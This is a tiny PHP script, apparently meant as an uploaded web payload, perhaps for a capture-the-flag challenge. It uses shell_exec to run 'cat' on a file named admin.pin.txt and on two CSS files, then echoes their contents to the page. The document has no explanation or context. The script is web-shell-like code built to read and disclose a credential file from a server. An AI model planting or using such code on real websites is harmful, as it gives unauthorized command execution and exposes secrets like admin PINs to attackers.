<?php
$output = shell_exec("cat admin.pin.txt");
echo "<pre>$output</pre>";
$output2 = shell_exec("cat home.css");
echo "<pre>$output2</pre>";
$output3 = shell_exec("cat index.css");
echo "<pre>$output3</pre>";
?>